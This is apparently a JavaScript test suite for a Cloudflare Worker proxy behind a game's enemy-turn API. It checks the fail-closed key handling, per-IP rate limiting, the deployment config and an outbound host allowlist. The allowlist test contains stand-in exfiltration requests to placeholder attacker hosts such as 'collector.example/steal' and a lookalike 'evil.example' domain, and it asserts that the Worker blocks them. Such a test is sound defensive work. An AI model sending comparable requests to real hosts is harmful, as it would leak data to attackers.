import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";

// The real network is replaced before the Worker wraps fetch, so nothing here leaves the machine.
const sent = [];
globalThis.fetch = async (input) => {
  sent.push(String(input instanceof Request ? input.url : input));
  return new Response("{}", { headers: { "content-type": "application/json" } });
};
const { default: worker, ALLOWED_HOSTS } = await import("../proxy/worker.js");
const { PROVIDERS } = await import("../src/jev.js");

const post = (path, body, headers = {}) =>
  new Request(`https://donjon-api.example.workers.dev${path}`, {
    method: "POST",
    headers: { "content-type": "application/json", ...headers },
    body: JSON.stringify(body),
  });
const limiter = (allow) => {
  const keys = [];
  return { keys, limit: async ({ key }) => (keys.push(key), { success: allow }) };
};
const KEY = { OPENROUTER_API_KEY: "sk-or-test" };

test("without a key the Worker refuses everything (fail closed)", async () => {
  const res = await worker.fetch(post("/api/enemy-turn", {}), {});
  assert.equal(res.status, 503);
  assert.equal(res.headers.get("access-control-allow-origin"), "*");
  assert.deepEqual(await res.json(), { error: "Server not configured" });
});

test("a caller over the per-IP limit gets 429 before any Jev work", async () => {
  const LIMITER = limiter(false);
  const res = await worker.fetch(post("/api/enemy-turn", { enemy: { species: "slime" } }, { "cf-connecting-ip": "203.0.113.7" }), { ...KEY, LIMITER });
  assert.equal(res.status, 429);
  assert.equal(res.headers.get("retry-after"), "60");
  assert.equal(res.headers.get("access-control-allow-origin"), "*");
  assert.deepEqual(LIMITER.keys, ["203.0.113.7"]);
});

test("CORS preflights skip the limiter", async () => {
  const LIMITER = limiter(false);
  const res = await worker.fetch(new Request("https://x.workers.dev/api/enemy-turn", { method: "OPTIONS" }), { ...KEY, LIMITER });
  assert.equal(res.status, 204);
  assert.deepEqual(LIMITER.keys, []);
});

test("an allowed request reaches the game's API handler", async () => {
  const res = await worker.fetch(post("/api/enemy-turn", { enemy: { species: "nobody" } }), { ...KEY, LIMITER: limiter(true) });
  assert.equal(res.status, 400);
  assert.deepEqual(await res.json(), { error: "Unknown monster" });
});

test("outbound requests go only to Jev, over https", async () => {
  sent.length = 0;
  await assert.rejects(fetch("https://collector.example/steal?k=1"), /Outbound request blocked/);
  await assert.rejects(fetch("http://openrouter.ai/api/alpha/decisions"), /Outbound request blocked/);
  await assert.rejects(fetch(new Request("https://api.typesafe.ai.evil.example/v1")), /Outbound request blocked/);
  assert.deepEqual(sent, []);
  await fetch(PROVIDERS.openrouter.url, { method: "POST", body: "{}" });
  await fetch(new Request(PROVIDERS.typesafe.url, { method: "POST", body: "{}" }));
  assert.deepEqual(sent, [PROVIDERS.openrouter.url, PROVIDERS.typesafe.url]);
});

test("every Jev provider host is allowed, so a new one has to be added to the Worker on purpose", () => {
  for (const { url } of Object.values(PROVIDERS)) assert.ok(ALLOWED_HOSTS.has(new URL(url).hostname), url);
});

// JSONC: strings are kept whole (so "https://" survives), comments outside them are dropped.
const parseJsonc = (text) => JSON.parse(text.replace(/("(?:\\.|[^"\\])*")|\/\/[^\n]*|\/\*[\s\S]*?\*\//g, (m, str) => str ?? ""));

test("wrangler.jsonc stays inside the Worker's scope: one workers.dev Worker, no routes, builds or extra bindings", () => {
  const config = parseJsonc(readFileSync(new URL("../proxy/wrangler.jsonc", import.meta.url), "utf8"));
  const allowed = ["$schema", "name", "main", "compatibility_date", "workers_dev", "preview_urls", "ratelimits", "observability"];
  assert.deepEqual(Object.keys(config).filter((k) => !allowed.includes(k)), [], "new top-level keys widen what CI deploys; review them");
  assert.equal(config.name, "donjon-api", "the CI token is scoped to the Worker named donjon-api");
  assert.equal(config.main, "worker.js");
  assert.equal(config.workers_dev, true);
  assert.equal(config.preview_urls, false);
  assert.equal(config.ratelimits.length, 1);
  const [rl] = config.ratelimits;
  assert.equal(rl.name, "LIMITER");
  assert.match(rl.namespace_id, /^\d+$/);
  assert.ok([10, 60].includes(rl.simple.period), "Cloudflare only takes a 10 or 60 second period");
  assert.ok(rl.simple.limit > 0);
});
